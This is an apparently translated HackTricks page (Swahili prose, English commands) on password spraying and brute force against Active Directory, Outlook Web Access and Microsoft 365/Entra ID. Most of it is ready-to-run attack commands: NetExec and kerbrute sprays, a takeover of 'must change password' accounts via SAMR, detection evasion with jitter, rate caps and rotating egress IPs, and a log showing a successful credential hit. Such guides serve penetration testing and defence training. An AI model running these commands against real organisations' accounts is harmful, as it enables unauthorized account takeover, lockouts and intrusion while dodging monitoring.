# Password Spraying / Brute Force

{{#include ../../banners/hacktricks-training.md}}


## **Password Spraying**

Baada ya kupata **valid usernames** kadhaa, unaweza kujaribu **passwords** zinazotumika zaidi (zingatia password policy ya mazingira) kwa kila mtumiaji uliyegundua.\
Kwa **default**, **minimum** ya **password** **length** ni 7.

Orodha za common usernames pia zinaweza kuwa muhimu: [https://github.com/insidetrust/statistically-likely-usernames](https://github.com/insidetrust/statistically-likely-usernames)

Kumbuka kwamba unaweza **kufunga baadhi ya accounts ukijaribu passwords kadhaa zisizo sahihi** (kwa default zaidi ya 10).

### Pata password policy

Ikiwa una credentials za mtumiaji au shell kama domain user, unaweza **kupata password policy kwa**:
```bash
# From Linux
crackmapexec <IP> -u 'user' -p 'password' --pass-pol

enum4linux -u 'username' -p 'password' -P <IP>

rpcclient -U "" -N 10.10.10.10;
rpcclient $>querydominfo

ldapsearch -h 10.10.10.10 -x -b "DC=DOMAIN_NAME,DC=LOCAL" -s sub "*" | grep -m 1 -B 10 pwdHistoryLength

# From Windows
net accounts

(Get-DomainPolicy)."SystemAccess" #From powerview
```
### Exploitation kutoka Linux (au zote)

- Kwa kutumia **crackmapexec:**
```bash
crackmapexec smb <IP> -u users.txt -p passwords.txt
# Local Auth Spray (once you found some local admin pass or hash)
## --local-auth flag indicate to only try 1 time per machine
crackmapexec smb --local-auth 10.10.10.10/23 -u administrator -H 10298e182387f9cab376ecd08491764a0 | grep +
```
- Kutumia **NetExec (CME successor)** kwa spraying inayolengwa na yenye kelele ndogo kwenye SMB/WinRM:
```bash
# Optional: generate a hosts entry to ensure Kerberos FQDN resolution
netexec smb <DC_IP> --generate-hosts-file hosts && cat hosts /etc/hosts | sudo sponge /etc/hosts

# Spray a single candidate password against harvested users over SMB
netexec smb <DC_FQDN> -u users.txt -p 'Password123!' \
--continue-on-success --no-bruteforce --shares

# Validate a hit over WinRM (or use SMB exec methods)
netexec winrm <DC_FQDN> -u <username> -p 'Password123!' -x "whoami"

# Tip: sync your clock before Kerberos-based auth to avoid skew issues
sudo ntpdate <DC_FQDN>
```
- Kutumia [**kerbrute**](https://github.com/ropnop/kerbrute) (Go)
```bash
# Password Spraying
./kerbrute_linux_amd64 passwordspray -d lab.ropnop.com [--dc 10.10.10.10] domain_users.txt Password123
# Brute-Force
./kerbrute_linux_amd64 bruteuser -d lab.ropnop.com [--dc 10.10.10.10] passwords.lst thoffman
```
- [**spray**](https://github.com/Greenwolf/Spray) _**(unaweza kubainisha idadi ya majaribio ili kuepuka kufungiwa kwa akaunti):**_<sup>[[3]](#references)</sup>
```bash
spray.sh -smb <targetIP> <usernameList> <passwordList> <AttemptsPerLockoutPeriod> <LockoutPeriodInMinutes> <DOMAIN>
```
- Kutumia [**kerbrute**](https://github.com/TarlogicSecurity/kerbrute) (python) - HAIPEKEZWI WAKATI MWINGINE HAIFANYI KAZI<sup>[[2]](#references)</sup>
```bash
python kerbrute.py -domain jurassic.park -users users.txt -passwords passwords.txt -outputfile jurassic_passwords.txt
python kerbrute.py -domain jurassic.park -users users.txt -password Password123 -outputfile jurassic_passwords.txt
```
- Kwa kutumia module ya `scanner/smb/smb_login` ya **Metasploit**:

![Password Spraying - Brute-Force: Kwa kutumia module ya scanner/smb/smb login ya Metasploit](<../../images/image (745).png>)

- Kwa kutumia **rpcclient**:<sup>[[6]](#references)</sup>
```bash
# https://www.blackhillsinfosec.com/password-spraying-other-fun-with-rpcclient/
for u in $(cat users.txt); do
rpcclient -U "$u%Welcome1" -c "getusername;quit" 10.10.10.10 | grep Authority;
done
```
#### Kutoka Windows

- Kwa kutumia toleo la [Rubeus](https://github.com/Zer1t0/Rubeus) lenye brute module:
```bash
# with a list of users
.\Rubeus.exe brute /users:<users_file> /passwords:<passwords_file> /domain:<domain_name> /outfile:<output_file>

# check passwords for all users in current domain
.\Rubeus.exe brute /passwords:<passwords_file> /outfile:<output_file>
```
- Kwa kutumia [**Invoke-DomainPasswordSpray**](https://github.com/dafthack/DomainPasswordSpray/blob/master/DomainPasswordSpray.ps1) (Kwa chaguo-msingi inaweza kutengeneza users kutoka kwenye domain na itapata password policy kutoka kwenye domain kisha kuweka kikomo cha majaribio kulingana nayo):<sup>[[4]](#references)</sup>
```bash
Invoke-DomainPasswordSpray -UserList .\users.txt -Password 123456 -Verbose
```
- Kwa kutumia [**Invoke-SprayEmptyPassword.ps1**](https://github.com/S3cur3Th1sSh1t/Creds/blob/master/PowershellScripts/Invoke-SprayEmptyPassword.ps1)
```
Invoke-SprayEmptyPassword
```
### Tambua na Chukua Udhibiti wa Akaunti za "Password must change at next logon" (SAMR)

Mbinu yenye kelele ndogo ni kuspray password salama/isiyo na kitu na kubaini akaunti zinazorudisha STATUS_PASSWORD_MUST_CHANGE, jambo linaloonyesha kuwa password ililazimishwa ku-expire na inaweza kubadilishwa bila kujua ya zamani.<sup>[[9]](#references)[[10]](#references)</sup>

Workflow:
- Enumerate users (RID brute kupitia SAMR) ili kuunda orodha ya walengwa:

{{#ref}}
../../network-services-pentesting/pentesting-smb/rpcclient-enumeration.md
{{#endref}}
```bash
# NetExec (null/guest) + RID brute to harvest users
netexec smb <dc_fqdn> -u '' -p '' --rid-brute | awk -F'\\\\| ' '/SidTypeUser/ {print $3}' > users.txt
```
- Nyunyizia password tupu na uendelee baada ya kupata hits ili kunasa akaunti zinazolazimika kubadilisha password wakati wa kuingia tena:
```bash
# Will show valid, lockout, and STATUS_PASSWORD_MUST_CHANGE among results
netexec smb <DC.FQDN> -u users.txt -p '' --continue-on-success
```
- Kwa kila hit, badilisha password kupitia SAMR ukitumia module ya NetExec (password ya zamani haihitajiki wakati "must change" imewekwa):
```bash
# Strong complexity to satisfy policy
env NEWPASS='P@ssw0rd!2025#' ; \
netexec smb <DC.FQDN> -u <User> -p '' -M change-password -o NEWPASS="$NEWPASS"

# Validate and retrieve domain password policy with the new creds
netexec smb <DC.FQDN> -u <User> -p "$NEWPASS" --pass-pol
```
Operational notes:
- Hakikisha saa ya host yako imesawazishwa na DC kabla ya operations zinazotegemea Kerberos: `sudo ntpdate <dc_fqdn>`.
- Alama ya [+] bila (Pwn3d!) katika baadhi ya modules (k.m., RDP/WinRM) inamaanisha kwamba creds ni sahihi, lakini account haina haki za interactive logon.

## Brute Force
```bash
legba kerberos --target 127.0.0.1 --username admin --password wordlists/passwords.txt --kerberos-realm example.org
```
### Kerberos pre-auth spraying yenye kulenga LDAP na throttling inayozingatia PSO (SpearSpray)

Kerberos pre-auth–based spraying hupunguza kelele ikilinganishwa na majaribio ya SMB/NTLM/LDAP bind na huendana vizuri zaidi na sera za AD za account lockout. SpearSpray huunganisha targeting inayoendeshwa na LDAP, pattern engine, na uelewa wa sera (domain policy + PSOs + badPwdCount buffer) ili kufanya spraying kwa usahihi na usalama. Pia inaweza kuweka tag kwa principals zilizo-compromise katika Neo4j kwa ajili ya BloodHound pathing.<sup>[[1]](#references)</sup>

Mawazo muhimu:
- LDAP user discovery yenye paging na LDAPS support, pamoja na kutumia custom LDAP filters kwa hiari.
- Domain lockout policy + PSO-aware filtering ili kuacha attempt buffer inayoweza kusanidiwa (threshold) na kuepuka ku-lock users.
- Kerberos pre-auth validation kwa kutumia fast gssapi bindings (hutengeneza 4768/4771 kwenye DCs badala ya 4625).
- Password generation ya kila user kulingana na patterns, kwa kutumia variables kama majina na temporal values zinazotokana na pwdLastSet ya kila user.
- Udhibiti wa throughput kwa kutumia threads, jitter, na requests per second za kiwango cha juu.
- Neo4j integration ya hiari ya kuweka tag kwa owned users kwa ajili ya BloodHound.

Matumizi ya msingi na discovery:
```bash
# List available pattern variables
spearspray -l

# Basic run (LDAP bind over TCP/389)
spearspray -u pentester -p Password123 -d fabrikam.local -dc dc01.fabrikam.local

# LDAPS (TCP/636)
spearspray -u pentester -p Password123 -d fabrikam.local -dc dc01.fabrikam.local --ssl
```
Kulenga na udhibiti wa muundo:
```bash
# Custom LDAP filter (e.g., target specific OU/attributes)
spearspray -u pentester -p Password123 -d fabrikam.local -dc dc01.fabrikam.local \
-q "(&(objectCategory=person)(objectClass=user)(department=IT))"

# Use separators/suffixes and an org token consumed by patterns via {separator}/{suffix}/{extra}
spearspray -u pentester -p Password123 -d fabrikam.local -dc dc01.fabrikam.local -sep @-_ -suf !? -x ACME
```
Udhibiti wa kujificha na usalama:
```bash
# Control concurrency, add jitter, and cap request rate
spearspray -u pentester -p Password123 -d fabrikam.local -dc dc01.fabrikam.local -t 5 -j 3,5 --max-rps 10

# Leave N attempts in reserve before lockout (default threshold: 2)
spearspray -u pentester -p Password123 -d fabrikam.local -dc dc01.fabrikam.local -thr 2
```
Uboreshaji wa Neo4j/BloodHound:
```bash
spearspray -u pentester -p Password123 -d fabrikam.local -dc dc01.fabrikam.local -nu neo4j -np bloodhound --uri bolt://localhost:7687
```
Muhtasari wa mfumo wa Pattern (patterns.txt):
```text
# Example templates consuming per-user attributes and temporal context
{name}{separator}{year}{suffix}
{month_en}{separator}{short_year}{suffix}
{season_en}{separator}{year}{suffix}
{samaccountname}
{extra}{separator}{year}{suffix}
```
Available variables include:
- {name}, {samaccountname}
- Temporal from each user’s pwdLastSet (or whenCreated): {year}, {short_year}, {month_number}, {month_en}, {season_en}
- Composition helpers and org token: {separator}, {suffix}, {extra}

Operational notes:
- Pendelea kuuliza PDC-emulator kwa kutumia -dc ili kusoma badPwdCount yenye mamlaka zaidi na maelezo yanayohusiana na policy.
- badPwdCount huwekwa upya kwenye jaribio linalofuata baada ya observation window; tumia threshold na timing ili kubaki salama.
- Kerberos pre-auth attempts huonekana kama 4768/4771 katika telemetry ya DC; tumia jitter na rate-limiting ili kuchanganyika na trafiki ya kawaida.

> Tip: SpearSpray’s default LDAP page size is 200; rekebisha kwa -lps inapohitajika.

## Outlook Web Access

Kuna tools nyingi za **password spraying outlook**.

- Kwa kutumia [MSF Owa_login](https://www.rapid7.com/db/modules/auxiliary/scanner/http/owa_login/)
- Kwa kutumia [MSF Owa_ews_login](https://www.rapid7.com/db/modules/auxiliary/scanner/http/owa_ews_login/)
- Kwa kutumia [Ruler](https://github.com/sensepost/ruler) (reliable!)<sup>[[5]](#references)</sup>
- Kwa kutumia [DomainPasswordSpray](https://github.com/dafthack/DomainPasswordSpray) (Powershell)
- Kwa kutumia [MailSniper](https://github.com/dafthack/MailSniper) (Powershell)

Ili kutumia tools zozote hizi, unahitaji orodha ya users na password moja / orodha ndogo ya passwords za kusprayi.
```bash
./ruler-linux64 --domain reel2.htb -k brute --users users.txt --passwords passwords.txt --delay 0 --verbose
[x] Failed: larsson:Summer2020
[x] Failed: cube0x0:Summer2020
[x] Failed: a.admin:Summer2020
[x] Failed: c.cube:Summer2020
[+] Success: s.svensson:Summer2020
```
## Microsoft 365 / Entra ID

Kwa cloud spraying, kwanza tambua ikiwa tenant ni **managed**, **federated**, au **hybrid**, kwa sababu endpoint na tabia ya lockout zinaweza kutofautiana na on-prem AD. Katika Microsoft Entra, **Smart Lockout** hubadilisha jinsi majaribio yanayorudiwa yanavyotumia lockout budget:<sup>[[7]](#references)</sup>

- Kurudia **same bad password** hakuendelezi kuongeza lockout counter, lakini kujaribu **new candidates** kunaongeza.
- Maeneo **familiar** na **unfamiliar** yana counters **separate**.
- Tenants zinazotumia **pass-through authentication (PTA)** hazinufaiki na bad-password hash tracking, kwa hiyo zichukulie zaidi kama targets za kawaida zinazohimili lockout.

Kwa vitendo, spray **one password per round**, weka spacing ya kutosha kati ya rounds, na pendelea tooling inayoweza kugundua auth flow halisi ya tenant kabla ya kutuma guesses.

- Ukiwa na [**TREVORspray**](https://github.com/blacklanternsecurity/TREVORspray), unaweza kufanya recon ya tenant, kugundua `token_endpoint`, kuspray `msol`/`adfs`/`owa`/`okta`, na kuzungusha traffic kupitia egress IPs nyingi:
```bash
# Enumerate tenant info, autodiscover, and the token endpoint
trevorspray --recon corp.com

# Spray against the discovered token endpoint with delay/jitter
trevorspray -u users.txt -p 'Winter2025!' \
--url https://login.windows.net/<tenant-id>/oauth2/token \
--delay 5 --jitter 3 --lockout-delay 60

# Round-robin between multiple SSH egress points
trevorspray -u users.txt -p 'Winter2025!' \
--url https://login.windows.net/<tenant-id>/oauth2/token \
--ssh root@1.2.3.4 root@4.3.2.1 --delay 5
```
- Kwa kutumia [**Spray365**](https://github.com/MarkoH17/Spray365), unaweza kuunda mapema **mpango wa utekelezaji** unaoweza kuendelea, kupanga kwa nasibu mpangilio wa auth, na kutekeleza **ucheleweshaji wa chini kwa kila user** ili kubaki nje ya lockout window:
```bash
# Generate a plan with shuffled auth order and a per-user minimum delay
python3 spray365.py generate normal -ep plan.s365 -d corp.com \
-u users.txt -pf passwords.txt --delay 30 -mD 1800 \
-S -rUA

# Execute the plan and abort after observing several lockouts
python3 spray365.py spray -ep plan.s365 -l 5
```
- Kwa kutumia [**o365spray**](https://github.com/0xZDH/o365spray), unaweza kuthibitisha tenant, kuorodhesha users kwa kutumia modules kama `onedrive`, na kufanya spray kupitia `oauth2` au `adfs`, huku ukidumisha **jaribio moja kwa kila user** ndani ya kipindi cha lockout. Ikiwa tayari una FireProx API, ipitishe kwa `--proxy-url` ili kusambaza source IPs:
```bash
o365spray --validate --domain corp.com
o365spray --enum -U users.txt --domain corp.com --enum-module onedrive
o365spray --spray -U valid.txt -P passwords.txt --count 1 --lockout 15 --domain corp.com
```
Recent operator tradecraft pia imeelekea kwenye **distributed cloud spraying**. [**TeamFiltration**](https://github.com/Flangvik/TeamFiltration) inasaidia time windows, password shuffling, ADFS/M365 spraying, na automatic post-auth exfiltration. Matumizi mabaya ya hivi karibuni katika ulimwengu halisi pia yalitumia **Microsoft Teams API** kwa account enumeration na **AWS region rotation** ili kusambaza spray waves kwenye maeneo mbalimbali ya kijiografia ya vyanzo.<sup>[[8]](#references)</sup>

## Google

- [https://github.com/ustayready/CredKing/blob/master/credking.py](https://github.com/ustayready/CredKing/blob/master/credking.py)

## Okta

- [https://github.com/ustayready/CredKing/blob/master/credking.py](https://github.com/ustayready/CredKing/blob/master/credking.py)
- [https://github.com/Rhynorater/Okta-Password-Sprayer](https://github.com/Rhynorater/Okta-Password-Sprayer)
- [https://github.com/knavesec/CredMaster](https://github.com/knavesec/CredMaster)

## References

- [1] [SpearSpray – Enhance Your Active Directory Password Spraying with User Intelligence](https://github.com/sikumy/spearspray)
- [2] [TarlogicSecurity/kerbrute – Kerberos bruteforcing with Impacket (Python)](https://github.com/TarlogicSecurity/kerbrute)
- [3] [Spray – A Password Spraying tool for Active Directory Credentials](https://github.com/Greenwolf/Spray)
- [4] [Active Directory Password Spraying](https://ired.team/offensive-security-experiments/active-directory-kerberos-abuse/active-directory-password-spraying)
- [5] [Password Spraying Outlook Web Access: Remote Shell](https://www.ired.team/offensive-security/initial-access/password-spraying-outlook-web-access-remote-shell)
- [6] [Password Spraying & Other Fun with RPCCLIENT](https://www.blackhillsinfosec.com/?p=5296)
- [7] [Microsoft Entra smart lockout](https://learn.microsoft.com/en-us/entra/identity/authentication/howto-password-smart-lockout)
- [8] [Proofpoint: Attackers Unleash TeamFiltration: Account Takeover Campaign](https://www.proofpoint.com/us/blog/threat-insight/attackers-unleash-teamfiltration-account-takeover-campaign)
- [9] [HTB Sendai – 0xdf: from spray to gMSA to DA/SYSTEM](https://0xdf.gitlab.io/2025/08/28/htb-sendai.html)
- [10] [HTB: Baby — Anonymous LDAP → Password Spray → SeBackupPrivilege → Domain Admin](https://0xdf.gitlab.io/2025/09/19/htb-baby.html)

{{#include ../../banners/hacktricks-training.md}}
